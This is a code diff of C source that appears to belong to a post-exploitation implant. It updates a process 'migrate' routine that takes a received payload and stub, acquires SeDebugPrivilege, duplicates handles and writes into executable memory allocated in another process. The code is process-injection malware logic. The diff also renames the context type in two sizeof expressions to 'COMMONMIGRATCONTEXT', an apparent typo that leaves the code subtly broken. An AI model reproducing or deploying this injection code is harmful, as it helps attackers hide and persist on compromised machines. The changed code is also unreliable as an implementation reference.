@@ -4,8 +4,15 @@
 
 DWORD get_migrate_context(LPDWORD contextSize, LPCOMMONMIGRATECONTEXT* contextBuffer)
 {
-	*contextBuffer = (LPCOMMONMIGRATECONTEXT)calloc(1, sizeof(COMMONMIGRATECONTEXT));
-	*contextSize = sizeof(COMMONMIGRATECONTEXT);
+	*contextBuffer = (LPCOMMONMIGRATECONTEXT)calloc(1, sizeof(COMMONMIGRATCONTEXT));
+
+	if (*contextBuffer == NULL)
+	{
+		return ERROR_OUTOFMEMORY;
+	}
+
+	*contextSize = sizeof(COMMONMIGRATCONTEXT);
+
 	return ERROR_SUCCESS;
 }
 
@@ -484,6 +491,7 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 	BYTE * lpPayloadBuffer = NULL;
 	LPVOID lpMigrateStub = NULL;
 	LPBYTE lpMemory = NULL;
+	LPBYTE lpUuid = NULL;
 	LPCOMMONMIGRATECONTEXT ctx = NULL;
 	DWORD ctxSize = 0;
 	DWORD dwMigrateStubLength = 0;
@@ -515,11 +523,14 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 		// Receive the actual migration payload buffer
 		lpPayloadBuffer = packet_get_tlv_value_string(packet, TLV_TYPE_MIGRATE_PAYLOAD);
 
-		// get the migrate stub info
+		// Get handles to the updated UUIDs if they're there
+		lpUuid = packet_get_tlv_value_raw(packet, TLV_TYPE_UUID);
+
+		// Get the migrate stub information
 		dwMigrateStubLength = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_STUB_LEN);
 		lpMigrateStub = packet_get_tlv_value_raw(packet, TLV_TYPE_MIGRATE_STUB);
 
-		dprintf("[MIGRATE] Attempting to migrate. ProcessID=%d, Arch=%s, StubLength=%d, PayloadLength=%d", dwProcessID, (dwDestinationArch == 2 ? "x64" : "x86"), dwMigrateStubLength, dwPayloadLength);
+		dprintf("[MIGRATE] Attempting to migrate. ProcessID=%d, Arch=%s, PayloadLength=%d", dwProcessID, (dwDestinationArch == 2 ? "x64" : "x86"), dwPayloadLength);
 
 		// If we can, get SeDebugPrivilege...
 		if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
@@ -549,13 +560,12 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 
 		// get the existing configuration
 		dprintf("[MIGRATE] creating the configuration block");
-		remote->config_create(remote, &config, &configSize);
+		remote->config_create(remote, lpUuid, &config, &configSize);
 		dprintf("[MIGRATE] Config of %u bytes stashed at 0x%p", configSize, config);
 
-		// get a transport-specific context if required, otherwise fallback on the default
-		if (remote->transport->get_migrate_context)
+		if (remote->transport->get_migrate_context != NULL)
 		{
-			dwResult = remote->transport->get_migrate_context(remote->transport, dwProcessID, hProcess, &ctxSize, (PBYTE*)&ctx);
+			dwResult = remote->transport->get_migrate_context(remote->transport, dwProcessID, hProcess, &ctxSize, (LPBYTE*)&ctx);
 		}
 		else
 		{
@@ -581,6 +591,8 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 		{
 			BREAK_ON_ERROR("[MIGRATE] DuplicateHandle failed");
 		}
+
+		dprintf("[MIGRATE] Duplicated Event Handle: 0x%x", (UINT_PTR)ctx->e.hEvent);
 
 		// Allocate memory for the migrate stub, context, payload and configuration block
 		lpMemory = (LPBYTE)VirtualAllocEx(hProcess, NULL, dwMigrateStubLength + ctxSize + dwPayloadLength + configSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
